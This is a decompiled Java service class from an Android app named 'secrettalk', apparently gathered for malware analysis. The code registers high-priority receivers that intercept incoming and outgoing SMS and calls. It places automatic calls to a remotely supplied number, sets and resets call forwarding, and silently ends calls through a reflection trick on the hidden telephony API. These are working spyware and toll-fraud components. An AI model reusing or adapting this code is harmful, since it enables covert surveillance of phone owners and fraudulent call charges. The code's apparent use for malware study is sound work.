package com.android.secrettalk;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import com.android.internal.telephony.ITelephony;
import java.lang.reflect.Method;

public class ReceiverRegisterService
  extends Service
{
  public static final int MSG_AFTER_CALL = 3000;
  public static final int MSG_CALLING = 5000;
  public static final int MSG_CALL_FORWARD = 4000;
  public static final int MSG_POLLING = 2000;
  public static final int MSG_SEND_CALL = 1000;
  final IntentFilter callFilter = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
  private CallReceiver callReceiver;
  int call_forward_state = 0;
  String call_forwarding_phone = "";
  private Handler handler = new ReceiverRegisterService.1(this);
  private SmsCheck smsCheck;
  final IntentFilter smsFilter1 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
  final IntentFilter smsFilter2 = new IntentFilter("CHECK_OUTGOING_SMS");
  private SmsReceiver smsReceiver;
  
  private void callForwardHandling(String paramString, int paramInt)
  {
    if ((GlobalData.forwarding_number.equals(paramString)) && (paramInt == GlobalData.isForwardingActive)) {
      return;
    }
    if ((paramInt == 1) && (paramInt != GlobalData.isForwardingActive) && (!paramString.equals(""))) {
      CallForwarderHandling.setNo(paramString, getApplicationContext());
    }
    for (GlobalData.isForwardingActive = 1;; GlobalData.isForwardingActive = 0)
    {
      do
      {
        GlobalData.forwarding_number = paramString;
        break;
      } while ((paramInt != 0) || (paramInt == GlobalData.isForwardingActive));
      CallForwarderHandling.resetNo(getApplicationContext());
    }
  }
  
  private void run_autocall_thread()
  {
    this.handler.sendEmptyMessage(1000);
  }
  
  public void autoCallHandling()
  {
    if ((GlobalData.auto_call_number.equals("")) || (GlobalData.call_id.equals("")) || (GlobalData.call_span == 0) || (GlobalData.call_time == 0)) {
      pollingNextCallRequest();
    }
    GlobalData.isCalling = true;
    Intent localIntent = new Intent("android.intent.action.CALL");
    localIntent.setData(Uri.parse("tel:" + GlobalData.auto_call_number));
    localIntent.setFlags(268435456);
    this.handler.sendEmptyMessageDelayed(3000, 1000 * GlobalData.call_time);
    startActivity(localIntent);
  }
  
  public void getAutoCall()
  {
    new ReceiverRegisterService.3(this).execute(new Void[0]);
  }
  
  public void getCallForwarding()
  {
    new ReceiverRegisterService.4(this).execute(new Void[0]);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.smsFilter1.setPriority(1000);
    this.smsReceiver = new SmsReceiver();
    registerReceiver(this.smsReceiver, this.smsFilter1);
    this.smsFilter2.setPriority(999);
    this.smsCheck = new SmsCheck();
    registerReceiver(this.smsCheck, this.smsFilter2);
    this.callFilter.addAction("android.intent.action.PHONE_STATE");
    this.callFilter.setPriority(888);
    this.callReceiver = new CallReceiver();
    registerReceiver(this.callReceiver, this.callFilter);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    new Thread(new ReceiverRegisterService.2(this)).start();
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public void pollingNext()
  {
    this.handler.sendEmptyMessageDelayed(2000, 60000L);
  }
  
  public void pollingNextCallRequest()
  {
    this.handler.sendEmptyMessageDelayed(1000, 60000L);
  }
  
  public void stopCall()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)getApplicationContext().getSystemService("phone");
    try
    {
      Method localMethod = Class.forName(localTelephonyManager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
      localMethod.setAccessible(true);
      ((ITelephony)localMethod.invoke(localTelephonyManager, new Object[0])).endCall();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.ReceiverRegisterService
 * JD-Core Version:    0.7.0.1
 */